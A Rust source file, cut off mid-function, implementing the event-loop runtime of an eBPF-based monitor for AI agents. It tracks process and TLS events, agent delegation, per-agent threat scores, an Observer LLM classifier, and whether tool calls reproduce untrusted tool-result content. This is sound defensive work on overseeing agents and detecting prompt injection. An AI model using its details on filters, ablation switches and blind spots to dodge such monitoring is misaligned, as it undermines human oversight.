// SPDX-License-Identifier: Apache-2.0 OR MIT
//
// runtime.rs — ResponsibilityRuntime: event loop orchestrator.
//
// Per spec §15, the runtime only wires together subsystems; it contains
// no business logic. It manages the Phase 1 (streaming) event loop and
// triggers Phase 2 (batch) at session end.
//
// Key methods:
//   process()     — the live event loop, driven as an `Analyzer`
//   route_event() — stringly-typed dispatch to signals/identity/evidence
//   trigger()     — debounced classification pipeline
//   finalize()    — Phase 2 authoritative batch refinement

use std::sync::OnceLock;
use std::time::Instant;

/// Comma/colon-separated comm prefixes whose file reads are harness indexers,
/// not agent intents. Opt-in: empty by default, so production capture is
/// unchanged. The benchmark sets this to drop code-indexer read storms that
/// otherwise dominate multi-agent finalize time and DB size.
fn ignored_file_comm_prefixes() -> &'static [String] {
    static PREFIXES: OnceLock<Vec<String>> = OnceLock::new();
    PREFIXES.get_or_init(|| {
        std::env::var("MTAGENTLENS_IGNORE_FILE_COMM_PREFIXES")
            .unwrap_or_default()
            .split([',', ':'])
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(str::to_owned)
            .collect()
    })
}

fn ignored_file_comm_matches(prefixes: &[String], event: &Event) -> bool {
    if !matches!(event.source.as_str(), "process" | "file_access") {
        return false;
    }
    let kind = event
        .data
        .get("event")
        .and_then(|value| value.as_str())
        .unwrap_or_default();
    if !matches!(
        kind,
        "FILE_OPEN" | "FILE_DELETE" | "FILE_WRITE" | "FILE_TRUNCATE" | "FILE_RENAME"
    ) {
        return false;
    }
    prefixes.iter().any(|prefix| event.comm.starts_with(prefix))
}

fn is_ignored_indexer_file_event(event: &Event) -> bool {
    ignored_file_comm_matches(ignored_file_comm_prefixes(), event)
}

use tokio::sync::broadcast;

use crate::framework::Event;
use crate::framework::analyzers::Analyzer;
use crate::framework::analyzers::AnalyzerError;
use crate::framework::runners::EventStream;
use crate::responsibility::claims::{AlertBuilder, ClaimBuilder, TracebackBuilder};

// This marks the broadcast send attempt, never browser receipt. IDs retain
// the exact alert -> claim links needed for evidence/action latency joins.
fn alert_emission_record(
    alert_id: &str,
    claim_ids: &[String],
    phase: &str,
    created_epoch_ns: u64,
    emitted_epoch_ns: u64,
    broadcast_delivered: bool,
) -> serde_json::Value {
    serde_json::json!({
        "alert_id": alert_id,
        "claim_ids": claim_ids,
        "phase": phase,
        "created_epoch_ns": created_epoch_ns,
        "emitted_epoch_ns": emitted_epoch_ns,
        "broadcast_delivered": broadcast_delivered,
    })
}

fn broadcast_alert_with_emission(
    sender: &broadcast::Sender<ResponsibilityAlert>,
    alert: ResponsibilityAlert,
) {
    let alert_id = alert.alert_id.to_string();
    let claim_ids = alert.engine.claim_ids.clone();
    let phase = match &alert.phase {
        crate::responsibility::types::PhaseIndicator::Provisional { .. } => "provisional",
        crate::responsibility::types::PhaseIndicator::Authoritative { .. } => "authoritative",
    };
    let created_epoch_ns = alert.timestamp_ns;
    let delivered = sender.send(alert).is_ok();
    let emitted_epoch_ns = current_time_ns();
    eprintln!(
        "[alert:emitted] {}",
        alert_emission_record(
            &alert_id,
            &claim_ids,
            phase,
            created_epoch_ns,
            emitted_epoch_ns,
            delivered,
        )
    );
}

/// Persist an alert without duplicating the full graph in every row.
///
/// The complete graph is stored once in graph_snapshots and in the frozen
/// checkpoint; alert rows keep metrics and the snapshot id only. The live SSE
/// alert keeps the complete graph in memory.
fn compact_alert_for_storage(alert: &ResponsibilityAlert) -> ResponsibilityAlert {
    let mut stored = alert.clone();
    stored.graph_snapshot.nodes.clear();
    stored.graph_snapshot.edges.clear();
    stored
}
use crate::responsibility::classification::PhaseClassificationEngine;
use crate::responsibility::classification::pattern_matcher::{
    GraphPatternMatcher, default_templates,
};
use crate::responsibility::classification::types::Route as ClassRoute;
use crate::responsibility::evidence::correlator::EvidenceCorrelator;
use crate::responsibility::graph::graph_builder::GraphBuilder;
use crate::responsibility::identity::resolver::{IdentityProvider, IdentityResolver};
use crate::responsibility::identity::union_find::AuthoritativeIdentityProvider;
use crate::responsibility::judgment::delegation::DelegationTracker;
use crate::responsibility::observer::ObserverProvider;
use crate::responsibility::observer::cache::ObserverCache;
use crate::responsibility::observer::types::{CacheKey, ObservedTaskContext};
use crate::responsibility::output::{EvaluationSummary, OutputFormat, OutputWriter};
use crate::responsibility::persistence::{
    BindingType, IdentityBeliefLevel, PersistRecord, PersistenceWriter, ProcessMetadata, TlsSession,
};
use crate::responsibility::replay::checkpoint::{
    FROZEN_GRAPH_INPUTS_VERSION, FrozenGraphInputs, FrozenIntentProvenance, FrozenTaskEnvelope,
};
use crate::responsibility::runtime::buffer::GraphDeltaBuffer;
use crate::responsibility::runtime::context_witness::CapturedRequestContext;
use crate::responsibility::runtime::provenance_tracker::ProvenanceTracker;
use crate::responsibility::runtime::routing::{
    DIAG_ACTIONS_DROPPED_BPF_NOISE, DIAG_ACTIONS_DROPPED_NO_AGENT, DIAG_ACTIONS_PRODUCED,
    DIAG_DELEGATION_PARENT_UNRESOLVED, DIAG_EVIDENCE_ATTEMPTED, DIAG_EVIDENCE_INTENTS,
    DIAG_INTENTS_DEDUPED, DIAG_OPENCLAW_TOOL_CALLS, dispatch_event,
};
use crate::responsibility::scoring::progressive::DimIndex;
use crate::responsibility::signals::SignalGraph;
use crate::responsibility::types::alert_types::{
    BehaviorTimeline, BehaviorTimelineEntry, ResponsibilityAlert,
};
use crate::responsibility::types::graph_types::{
    GraphSnapshot, ResponsibilityEdgeType as NewEdgeType, ResponsibilityNodeType as NewNodeType,
};
use crate::responsibility::types::ids::{
    ActionId, AgentId, AlertId, ClaimId, EdgeId, IntentId, ProcessId,
};
use futures::StreamExt;
use std::collections::{HashMap, HashSet};
use std::sync::atomic::{AtomicBool, Ordering};

/// Global shutdown signal. Set by the SIGINT handler in main.rs.
/// The runtime polls this in its event loop to trigger Phase 2 finalization.
pub static RUNTIME_SHUTDOWN: AtomicBool = AtomicBool::new(false);

// ─── Runtime Configuration ────────────────────────────────────────────

/// Runtime configuration per spec §15.
#[derive(Debug, Clone)]
pub struct RuntimeConfig {
    /// Minimum time between classification triggers (ms).
    pub debounce_ms: u64,
    /// Force a trigger every N events.
    pub trigger_every_n: usize,
    /// Maximum Observer LLM calls per session.
    pub max_observer_calls: usize,
    /// Disable the responsibility-layer Observer LLM (→ heuristic only).
    /// Used for ablation A4: measures Observer's marginal contribution.
    pub disable_observer: bool,
    /// Disable graph-pattern verdicts (ablation A-pattern).
    ///
    /// Patterns are structural hints; disabling them must be attributable.
    /// The runtime then feeds an empty template set to the matcher.
    pub disable_patterns: bool,
    /// Disable process-spawn delegation tracking (ablation A-delegation).
    pub disable_delegation: bool,
    /// Benchmark scenario id recorded in `runs.scenario_id`. `None` for
    /// ad-hoc runs; the row then stays honestly empty.
    pub scenario_id: Option<String>,
    /// Scenario execution mode recorded in `runs.mode`.
    pub run_mode: Option<String>,
}

impl Default for RuntimeConfig {
    fn default() -> Self {
        Self {
            // 满血默认: 2 秒去抖, 每 50 事件强制触发, 最多 100 次 Observer 调用
            debounce_ms: 2000,
            trigger_every_n: 50,
            max_observer_calls: 100,
            disable_observer: false,
            disable_patterns: false,
            disable_delegation: false,
            scenario_id: None,
            run_mode: None,
        }
    }
}

// ─── ResponsibilityRuntime ────────────────────────────────────────────

/// Central orchestrator that wires together all Phase 1 and Phase 2
/// subsystems.
///
/// # Architecture
///
/// ```text
/// Event → route_event() → signals/identity/evidence
///        ↑
/// trigger() → classification → claims → persistence → broadcast
///        ↑
/// finalize() → Phase 2 authoritative resolution
/// ```
///
/// Per spec §2.1 hard rule: the runtime only wires — it contains no
/// business logic. All analysis is delegated to the submodules.
pub struct ResponsibilityRuntime {
    /// Live signal graph (process tree, TLS bindings, message bindings).
    signal_graph: SignalGraph,
    /// Phase 1 provisional identity resolver.
    identity_resolver: IdentityResolver,
    /// Streaming evidence correlator (intent-action matching).
    evidence_correlator: EvidenceCorrelator,
    /// Correlation rows retained for outcome joins after each streaming drain.
    review_evidence: Vec<crate::responsibility::types::CorrelationEvidence>,
    /// Incremental graph builder (handles correlations one at a time).
    graph_builder: GraphBuilder,
    /// Process-spawn delegation tracker (agent A spawns a process that
    /// resolves to agent B). Complements the graph builder's observed
    /// cross-agent orchestration signal.
    delegation_tracker: DelegationTracker,
    /// Phase-aware classification engine (route + score).
    classification_engine: PhaseClassificationEngine,
    /// Observer LLM provider (may be mock for development).
    observer: Box<dyn ObserverProvider>,
    /// L1+L2 cache for observer decisions.
    observer_cache: ObserverCache,
    /// OS-observable content provenance for this run.
    provenance: ProvenanceTracker,
    /// Request-local captured source witnesses for this run.
    captured_request_contexts: Vec<CapturedRequestContext>,
    /// Latest behavioral-baseline deviation (D6) seen in phase 1.
    last_baseline_deviation: Option<f32>,
    /// Strongest CUSUM alarm state observed across phase-1 cycles.
    last_cusum_triggered: bool,
    last_cusum_dimensions: Vec<String>,
    /// Strongest fused progressive score observed across phase-1 cycles.
    last_progressive_fused: f64,
    /// Capability envelopes derived from each agent's user task.
    envelopes: std::collections::HashMap<
        crate::responsibility::types::AgentId,
        crate::responsibility::provenance::CapabilityEnvelope,
    >,
    /// Exact derived task envelopes keyed by the source `UserPrompt` intent.
    /// These are the PRE-resolver reconstruction inputs; `envelopes` remains
    /// the live per-agent grant used by the streaming graph.
    task_envelopes:
        std::collections::HashMap<IntentId, crate::responsibility::provenance::CapabilityEnvelope>,
    /// Fire-and-forget persistence writer (bounded mpsc channel).
    persistence: PersistenceWriter,
    /// Optional live-forward channel for raw framework events.
    ///
    /// The runtime is the last analyzer, so the runner's output stream is not
    /// a live path: buffering events there starved `/api/live/events` until
    /// the run ended and lost the buffer on shutdown. Forwarding from here
    /// keeps the live view real-time without retaining events.
    raw_event_tx: Option<tokio::sync::broadcast::Sender<crate::framework::Event>>,
    terminal_health:
        Option<std::sync::Arc<std::sync::Mutex<crate::framework::health::TerminalHealth>>>,
    /// Unified cross-layer bus (scoring / classification / claims / alerts).
    /// Composed alerts forwarded to SSE / frontend subscribers.
    alert_tx: broadcast::Sender<ResponsibilityAlert>,
    /// Running count of events processed.
    event_count: usize,
    /// Observed events per runner source (`process`, `ssl`, `system`, `stdio`).
    ///
    /// Capture quality checks loss *and* coverage: a process helper that
    /// attached, lost nothing, and observed no event did not see the run.
    source_counts: std::collections::BTreeMap<String, u64>,
    /// v9 Progressive threat scorer — six-dimension per-agent EWMA/CUSUM.
    progressive_scorer: crate::responsibility::scoring::progressive::ProgressiveScorer,
    /// v9 Behavioral baseline tracker — per-agent syscall/file/network profiling.
    baseline_tracker: crate::responsibility::scoring::baseline::BaselineTracker,
    /// v9 Calibration monitor — tracks ECE and triggers re-calibration.
    /// Running count of Observer LLM calls (capped by config).
    observer_calls: usize,
    /// Observer calls that failed (timeout, parse error, provider error).
    observer_failures: usize,
    /// Runtime configuration.
    config: RuntimeConfig,
    /// Thin graph delta buffer (accumulates between triggers).
    graph_buffer: GraphDeltaBuffer,
    /// Phase 1 alert IDs (for refinement comparison in Phase 2).
    phase1_alert_ids: Vec<AlertId>,
    /// Every semantic verdict and failure observed during phase 1. Phase 2
    /// aggregates these with its own hard evidence; it never re-decides from
    /// the static score alone (that is how an Observer `Unsafe` turned into a
    /// final `Safe`).
    phase1_observations: Vec<crate::responsibility::classification::final_decision::Observation>,
    /// Run id of the current session, set by `init_session`. Phase 2 writes
    /// the run's aggregated verdict keyed by this id.
    current_run_id: Option<String>,
    /// Session start measured by `init_session`; the console summary reports
    /// this run's wall-clock duration instead of a constant zero.
    run_started_ns: Option<u64>,
    /// Collector procfs context measured at this run's start, not reconstructed at replay.
    recording_context_start: Option<serde_json::Value>,
    /// Deduplicated raw EXEC namespace witnesses; independent of detector identities.
    process_namespace_mappings: std::collections::BTreeSet<String>,
    process_namespace_mapping_dropped: u64,
    initial_process_snapshot: std::collections::BTreeSet<String>,
    initial_process_snapshot_dropped: u64,
    /// Phase 1 claim IDs already alerted. ClaimId is now deterministically
    /// derived from the logical key, so the Set inherently deduplicates
    /// across trigger cycles.
    phase1_claim_ids: HashSet<ClaimId>,
    /// Phase-1 claims by id. Phase 2 rebuilds claims from the frozen graph; a
    /// refinement must point at the rebuilt claim with the same logical key,
    /// not at a placeholder id that joins to nothing.
    phase1_claims: std::collections::HashMap<
        ClaimId,
        crate::responsibility::types::alert_types::ResponsibilityClaim,
    >,
    /// PBC edge IDs that have already been claimed in a previous trigger cycle.
    /// Prevents duplicate claims and alert inflation.
    claimed_edge_ids: HashSet<EdgeId>,
    /// Taint-gate counters accumulated across trigger cycles. A run with zero
    /// `TaintedContextUse` claims must be distinguishable from one where the
    /// gate suppressed authorized or unattributable shares.
    claim_diagnostics: crate::responsibility::claims::claim_builder::ClaimBuildDiagnostics,
    /// Behavior timeline (accumulated across triggers).
    timeline: Vec<BehaviorTimelineEntry>,
    /// Intent IDs that were successfully queued for persistence. Evidence
    /// referencing any other intent (dropped due to backpressure, or never
    /// persisted) is skipped rather than failing a FOREIGN KEY constraint.
    persisted_intent_ids: HashSet<IntentId>,
    /// Action IDs that were successfully queued for persistence.
    persisted_action_ids: HashSet<ActionId>,
    /// Provisional `(agent, pid, start, belief)` mappings already queued.
    /// Without this set the dispatch path re-wrote every mapping on every
    /// event — O(processes x events) records that saturated the writer
    /// channel and turned into tens of thousands of dropped rows.
    persisted_identity_mappings: HashSet<(AgentId, u32, u64, IdentityBeliefLevel)>,
    /// Last persisted process set per provisional agent. The identity row is
    /// rewritten only when the set changes instead of once per event.
    persisted_provisional_sets: HashMap<AgentId, Vec<(u32, u64)>>,
    /// Whether new data has arrived since the last trigger.
    dirty: bool,
    /// Diagnostic: TLS event count.
    diag_tls_count: u64,
    /// Decode outcome histogram for TLS events (ok/partial/incomplete/...).
    decode_status: std::collections::HashMap<String, u64>,
    /// TLS events marked partial by the payload normalizer.
    partial_tls_events: u64,
    /// Pipeline latency samples (microseconds); bounded per stage.
    latency: LatencySamples,
    /// When the most recent event reached the runtime (alert latency anchor).
    last_event_at: Option<Instant>,
}

/// Bounded latency samples for the online path.
#[derive(Default)]
struct LatencySamples {
    route_us: Vec<u64>,
    graph_update_us: Vec<u64>,
    graph_update_count: u64,
    graph_update_total_ns: u64,
    trigger_us: Vec<u64>,
    alert_us: Vec<u64>,
}

const LATENCY_CAP: usize = 20_000;

impl LatencySamples {
    fn record(samples: &mut Vec<u64>, elapsed: std::time::Duration) {
        if samples.len() < LATENCY_CAP {
            samples.push(elapsed.as_micros() as u64);
        }
    }

    fn record_graph_update(&mut self, elapsed: std::time::Duration) {
        self.graph_update_count = self.graph_update_count.saturating_add(1);
        self.graph_update_total_ns = self
            .graph_update_total_ns
            .saturating_add(elapsed.as_nanos().min(u64::MAX as u128) as u64);
        Self::record(&mut self.graph_update_us, elapsed);
    }

    fn summary(&self) -> serde_json::Value {
        fn stats(samples: &[u64]) -> serde_json::Value {
            if samples.is_empty() {
                return serde_json::json!({ "count": 0, "p50_us": null, "p95_us": null, "p99_us": null, "max_us": null });
            }
            let mut sorted = samples.to_vec();
            sorted.sort_unstable();
            let pick = |p: f64| -> u64 {
                let idx = ((p / 100.0) * sorted.len() as f64).ceil() as usize;
                sorted[idx.saturating_sub(1).min(sorted.len() - 1)]
            };
            serde_json::json!({
                "count": sorted.len(),
                "p50_us": pick(50.0),
                "p95_us": pick(95.0),
                "p99_us": pick(99.0),
                "max_us": sorted[sorted.len() - 1],
            })
        }
        let mut graph_update = stats(&self.graph_update_us);
        graph_update["total_count"] = self.graph_update_count.into();
        graph_update["total_ns"] = self.graph_update_total_ns.into();
        serde_json::json!({
            "route_event": stats(&self.route_us),
            "graph_update": graph_update,
            "trigger": stats(&self.trigger_us),
            "event_to_alert": stats(&self.alert_us),
        })
    }
}

impl ResponsibilityRuntime {
    // ── Construction ─────────────────────────────────────────────────

    /// Create a new ResponsibilityRuntime.
    ///
    /// The `persistence` writer should already be spawned (it runs its own
    /// tokio task). The `alert_tx` is used to push alerts to frontend SSE
    /// consumers. The `observer` provides LLM arbitration for ambiguous
    /// classifications (may be a MockObserverProvider in dev).
    pub fn new(
        config: RuntimeConfig,
        persistence: PersistenceWriter,
        alert_tx: broadcast::Sender<ResponsibilityAlert>,
        observer: Box<dyn ObserverProvider>,
    ) -> Self {
        Self {
            signal_graph: SignalGraph::new(),
            identity_resolver: IdentityResolver::new(),
            evidence_correlator: EvidenceCorrelator::new(),
            review_evidence: Vec::new(),
            graph_builder: GraphBuilder::with_default_config(),
            delegation_tracker: DelegationTracker::new(),
            classification_engine: PhaseClassificationEngine::new(),
            observer,
            observer_cache: ObserverCache::new(),
            provenance: ProvenanceTracker::new(),
            captured_request_contexts: Vec::new(),
            last_baseline_deviation: None,
            last_cusum_triggered: false,
            last_cusum_dimensions: Vec::new(),
            last_progressive_fused: 0.0,
            envelopes: std::collections::HashMap::new(),
            task_envelopes: std::collections::HashMap::new(),
            persistence,
            raw_event_tx: None,
            terminal_health: None,
            alert_tx,
            event_count: 0,
            source_counts: std::collections::BTreeMap::new(),
            observer_calls: 0,
            observer_failures: 0,
            config,
            graph_buffer: GraphDeltaBuffer::new(),
            phase1_alert_ids: Vec::new(),
            phase1_observations: Vec::new(),
            current_run_id: None,
            run_started_ns: None,
            recording_context_start: None,
            process_namespace_mappings: std::collections::BTreeSet::new(),
            process_namespace_mapping_dropped: 0,
            initial_process_snapshot: std::collections::BTreeSet::new(),
            initial_process_snapshot_dropped: 0,
            phase1_claim_ids: HashSet::new(),
            phase1_claims: std::collections::HashMap::new(),
            claimed_edge_ids: HashSet::new(),
            claim_diagnostics: Default::default(),
            timeline: Vec::new(),
            progressive_scorer: crate::responsibility::scoring::progressive::ProgressiveScorer::new(
                crate::responsibility::scoring::progressive::ProgressiveConfig::default(),
            ),
            baseline_tracker: crate::responsibility::scoring::baseline::BaselineTracker::new(),
            persisted_intent_ids: HashSet::new(),
            persisted_action_ids: HashSet::new(),
            persisted_identity_mappings: HashSet::new(),
            persisted_provisional_sets: HashMap::new(),
            dirty: false,
            diag_tls_count: 0,
            decode_status: std::collections::HashMap::new(),
            partial_tls_events: 0,
            latency: LatencySamples::default(),
            last_event_at: None,
        }
    }

    /// Forward every routed event to `tx` as it arrives (live SSE).
    pub fn with_raw_event_sender(
        mut self,
        tx: tokio::sync::broadcast::Sender<crate::framework::Event>,
    ) -> Self {
        self.raw_event_tx = Some(tx);
        self
    }

    pub fn with_terminal_health(
        mut self,
        health: std::sync::Arc<std::sync::Mutex<crate::framework::health::TerminalHealth>>,
    ) -> Self {
        self.terminal_health = Some(health);
        self
    }

    // ── Session Initialization (shared by run() and process()) ──────

    /// Initialize a new monitoring session.
    ///
    /// Records collector context and writes a RunStart marker
    /// to persistence so the writer task has an active `current_run_id`.
    /// Returns the generated run_id for RunEnd / cleanup use.
    fn init_session(&mut self) -> String {
        self.process_namespace_mappings.clear();
        self.process_namespace_mapping_dropped = 0;
        self.initial_process_snapshot.clear();
        self.initial_process_snapshot_dropped = 0;
        self.recording_context_start = Some(super::recording_context::capture());
        let now_ns = current_time_ns();
        // No Observer verdict or provenance span may survive into a new run.
        self.observer_cache.clear_task_bound();
        self.provenance.clear();
        self.captured_request_contexts.clear();
        self.review_evidence.clear();
        let run_id = uuid::Uuid::new_v4().to_string();
        self.run_started_ns = Some(now_ns);
        self.current_run_id = Some(run_id.clone());
        let _ = self.persistence.write(PersistRecord::RunStart {
            run_id: run_id.clone(),
            timestamp_ns: now_ns,
        });
        if self.config.scenario_id.is_some() || self.config.run_mode.is_some() {
            let _ = self.persistence.write(PersistRecord::RunContext {
                run_id: run_id.clone(),
                scenario_id: self.config.scenario_id.clone(),
                mode: self.config.run_mode.clone(),
            });
        }
        run_id
    }

    // ── Event Routing ────────────────────────────────────────────────

    /// Route a single framework event to the appropriate subsystems.
    ///
    /// Inspects the event's `source` and `data` fields to determine
    /// routing (EXEC/EXIT → signals, TLS → signals, HTTP → evidence,
    /// Syscall → evidence). Delegates to `routing::dispatch_event()`.
    ///
    /// Before dispatching, persists raw events (process, TLS) to the
    /// async writer per spec §13.1 Phase 1 persistence contract.
    ///
    /// Returns a `Vec<Event>` of output events for downstream framework
    /// analyzers (e.g., signal events, alert events).
    /// Route one event through the responsibility subsystems.
    ///
    /// Takes `&Event` so callers can forward the original event downstream
    /// unchanged: the runtime is an Analyzer in a global chain, and the
    /// analyzers after it must still see every event.
    pub fn route_event(&mut self, event: &Event) -> Vec<Event> {
        let started = Instant::now();
        let is_capture_health =
            event.data.get("event").and_then(|value| value.as_str()) == Some("CAPTURE_HEALTH");
        if !is_capture_health {
            *self.source_counts.entry(event.source.clone()).or_insert(0) += 1;
        }
        let partial_before = self.partial_tls_events;
        let output = if is_capture_health {
            Vec::new()
        } else {
            self.route_event_inner(event)
        };
        let elapsed = started.elapsed();
        LatencySamples::record(&mut self.latency.route_us, elapsed);
        if let Some(health) = &self.terminal_health
            && let Ok(mut health) = health.lock()
        {
            health.record_processed(
                elapsed,
                output.len(),
                self.partial_tls_events.saturating_sub(partial_before),
            );
        }
        output
    }

    fn route_event_inner(&mut self, event: &Event) -> Vec<Event> {
        // stdio capture is raw process I/O (file/pipe bytes), not an LLM
        // response. Feeding it to IntentExtractor turns file content into
        // phantom tool intents; keep it terminal until a dedicated content
        // observation path is enabled (P3-b).
        if crate::responsibility::runtime::routing::is_terminal_runtime_source(&event.source) {
            return Vec::new();
        }
        if is_ignored_indexer_file_event(event) {
            return Vec::new();
        }

        let intents_before = self.graph_buffer.intents.len();
        let actions_before = self.graph_buffer.actions.len();

        self.persist_raw_event(&event);
        // Every provenance lookup is explicitly scoped to the observed run.
        let run_id = self.current_run_id.clone().unwrap_or_default();

        // Provenance spans and conversation hints are physical capture facts:
        // only the canonical TLS converters (ssl/http_parser/sse_processor)
        // may supply them. A payload that merely looks like a request (stdio,
        // out-of-band, unknown) is not a network capture.
        if let Some(body) =
            crate::responsibility::runtime::routing::captured_llm_request_body(event)
        {
            let body = crate::responsibility::runtime::routing::strip_http_headers(body);
            let unqualified_pid = crate::responsibility::types::ProcessId::new(
                event.pid,
                event
                    .data
                    .get("start_time_ns")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0),
            );
            // TLS/HTTP events carry no start_time_ns, so ProcessId(pid, 0)
            // matched no resolved process and the request was attributed to
            // no agent — or, after a PID reuse, to the wrong one. Resolve the
            // real key through the signal graph first.
            let pid = {
                let snapshot = self.signal_graph.snapshot();
                crate::responsibility::runtime::routing::resolve_process_id(
                    unqualified_pid,
                    &snapshot,
                )
            };
            let agent = self.identity_resolver.agent_for_process(pid);
            let added = self.provenance.observe_request(
                &run_id,
                agent.as_ref().map(|a| a.as_str()),
                body,
                event.timestamp,
            );
            if added > 0 {
                eprintln!("[provenance] registered {added} untrusted tool-result span(s)");
            }
            if let Some(conversation_id) =
                crate::responsibility::runtime::provenance_tracker::parse_conversation_id(body)
            {
                self.signal_graph
                    .observe_conversation(pid, &conversation_id, event.timestamp);
            }
        }

        let dispatch = dispatch_event(
            &event,
            &mut self.signal_graph,
            &mut self.identity_resolver,
            &mut self.evidence_correlator,
            &mut self.graph_buffer,
        );
        let output = dispatch.output_events;

        // Freeze request-local source witnesses only for a captured request
        // body that produced an actual message binding. The binding supplies
        // the MessageId; this path never invents one.
        if let Some(body) =
            crate::responsibility::runtime::routing::captured_llm_request_body(event)
        {
            let snapshot = self.signal_graph.snapshot();
            let process = crate::responsibility::runtime::routing::resolve_process_id(
                crate::responsibility::types::ProcessId::new(
                    event.pid,
                    event
                        .data
                        .get("start_time_ns")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0),
                ),
                &snapshot,
            );
            for binding in &dispatch.message_bindings {
                if binding.pid != process.pid || binding.start_time_ns != process.start_time_ns {
                    continue;
                }
                if let Some(context) = CapturedRequestContext::build(
                    body,
                    &run_id,
                    process,
                    binding.message_id.clone(),
                    event.timestamp,
                ) {
                    self.captured_request_contexts.push(context);
                }
            }
        }

        // Message→TLS bindings surfaced during intent extraction. Routing has
        // no writer handle, so it hands them back here. This replaces the
        // binding that `flush_conn_buffers` produced as a by-product of
        // re-extracting the same payload — which duplicated every intent,
        // since `MessageId` is generated fresh per run and the correlator's
        // (intent_id, action_id) dedup key could therefore never match.
        for binding in dispatch.message_bindings {
            let binding_type = if binding.tls_session_id.is_some() {
                BindingType::TlsShared
            } else {
                BindingType::DirectProcess
            };
            let _ = self.persistence.write(PersistRecord::MessageBinding {
                message_id: binding.message_id,
                pid: binding.pid,
                start_time_ns: binding.start_time_ns,
                tls_session_id: binding.tls_session_id,
                binding_type,
                timestamp_ns: binding.timestamp_ns,
            });
        }

        // Provenance: does a new tool call reproduce untrusted content?
        let new_intents: Vec<_> = self.graph_buffer.intents[intents_before..].to_vec();
        for intent in &new_intents {
            let agent = self.identity_resolver.agent_for_process(intent.process_id);
            if let Some((tag, matched)) =
                self.provenance
                    .annotate_intent(&run_id, intent, agent.as_ref().map(|a| a.as_str()))
            {
                self.graph_builder.set_intent_provenance(
                    &intent.intent_id,
                    tag,
                    &matched.span_id,
                    &matched.source,
                );
                eprintln!(
                    "[provenance] intent {} reproduces untrusted content from {} (span {})",
                    intent.intent_id.as_str(),
                    matched.source,
                    matched.span_id
                );
            }
        }

        // Persist new intents and actions for replay support.
        // Phase 2 replay reads these from SQLite to re-run batch correlation.
        for intent in &self.graph_buffer.intents[intents_before..] {
            if self
                .persistence
                .write(PersistRecord::Intent(intent.clone()))
            {
                self.persisted_intent_ids.insert(intent.intent_id.clone());
            }
        }
        for action in &self.graph_buffer.actions[actions_before..] {
            if self
                .persistence
                .write(PersistRecord::Action(action.clone()))
            {
                self.persisted_action_ids.insert(action.action_id.clone());
            }
        }

        self.detect_delegations(&event);

        output
    }

    /// Detect process-spawn delegations for this event.
    ///
    /// An orchestration tool call is only one way agents hand work to each
    /// other; the other is a process spawn that later resolves to a different
    /// agent. Recording the spawn here lets the graph builder's policy gate
    /// distinguish a verified delegation (Observed) from an unverified
    /// cross-agent orchestration (Ambiguous).
    fn detect_delegations(&mut self, event: &Event) {
        if self.config.disable_delegation {
            return;
        }
        let is_exec = event.data.get("event").and_then(|v| v.as_str()) == Some("EXEC");
        if !is_exec && self.delegation_tracker.pending_count() == 0 {
            return;
        }

        // pid → agent from the current provisional identities. Built only when
        // there is something to resolve (EXEC or pending spawns).
        let mut pid_agent: HashMap<u32, String> = HashMap::new();
        for identity in self.identity_resolver.provisional_identities() {
            for process_id in &identity.process_ids {
                pid_agent.insert(process_id.pid, identity.agent_id.to_string());
            }
        }

        if is_exec {
            let ppid = event
                .data
                .get("ppid")
                .and_then(|v| v.as_u64())
                .map(|v| v as u32);
            match ppid.and_then(|ppid| pid_agent.get(&ppid).map(|agent| (ppid, agent))) {
                Some((ppid, parent_agent)) => {
                    let parent_start_time_ns = event
                        .data
                        .get("parent_start_time_ns")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0);
                    let child_start_time_ns = event
                        .data
                        .get("start_time_ns")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0);
                    self.delegation_tracker.record_spawn(
                        crate::responsibility::judgment::delegation::SpawnObservation {
                            parent_pid: ppid,
                            parent_start_time_ns,
                            child_pid: event.pid,
                            child_start_time_ns,
                            parent_agent_id: parent_agent.as_str(),
                            timestamp_ns: event.timestamp,
                            child_comm: &event.comm,
                        },
                    );
                }
                None => {
                    // The parent's agent identity is not known yet. The spawn
                    // is not a delegation, so the taint gate would call the
                    // pair unauthorized; count it so "authorization evidence
                    // was never captured" is visible in diagnostics.
                    DIAG_DELEGATION_PARENT_UNRESOLVED
                        .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                }
            }
        }

        for record in self.delegation_tracker.drain_delegations(&pid_agent) {
            // The builder still records the delegation endpoints in memory for
            // claims and classification, but no per-trigger graph rows are
            // persisted: the final `graph_snapshots` row is the single
            // canonical graph.
            let _ = self
                .graph_builder
                .record_delegation_with_nodes(record.clone());
            // The tracker observation and the persisted record carry the same
            // facts in different shapes; convert here so the delegation table
            // keeps typed process IDs (pid + start time, immune to pid reuse).
            let persisted = crate::responsibility::types::policy_types::DelegationRecord {
                delegation_id: record.delegation_id.clone(),
                from_agent: crate::responsibility::types::AgentId::from(
                    record.from_agent_id.clone(),
                ),
                to_agent: crate::responsibility::types::AgentId::from(record.to_agent_id.clone()),
                parent_process: crate::responsibility::types::ProcessId::new(
                    record.parent_pid,
                    record.parent_start_time_ns,
                ),
                child_process: crate::responsibility::types::ProcessId::new(
                    record.child_pid,
                    record.child_start_time_ns,
                ),
                timestamp_ns: record.timestamp_ns,
                confidence: record.confidence,
            };
            let _ = self.persistence.write(PersistRecord::Delegation(persisted));
        }
    }

    /// Persist raw eBPF events (EXEC, TLS) and accumulate SSL data.
    ///
    /// Fire-and-forget per spec §13.1: uses try_send, drops silently
    /// on full channel. Also accumulates SSL data chunks into per-connection
    /// buffers for later intent extraction (handles chunked/streaming APIs).
    fn persist_raw_event(&mut self, event: &Event) {
        let event_type = event.data.get("event").and_then(|v| v.as_str());

        // ── Process event persistence ──────────────────────────────
        if event_type == Some("EXEC")
            || (event_type == Some("PROCESS_SNAPSHOT") && event.source == "process")
        {
            let pid = event
                .data
                .get("pid")
                .and_then(|v| v.as_u64())
                .unwrap_or(event.pid as u64) as u32;
            let start_time_ns = event
                .data
                .get("start_time_ns")
                .and_then(|v| v.as_u64())
                .unwrap_or(0);
            let parent_pid = event
                .data
                .get("ppid")
                .and_then(|v| v.as_u64())
                .map(|v| v as u32);
            let parent_start_time_ns = event
                .data
                .get("parent_start_time_ns")
                .and_then(|v| v.as_u64());
            let comm = event
                .data
                .get("comm")
                .and_then(|v| v.as_str())
                .unwrap_or(&event.comm)
                .to_string();

            if event_type == Some("EXEC")
                && event.source == "process"
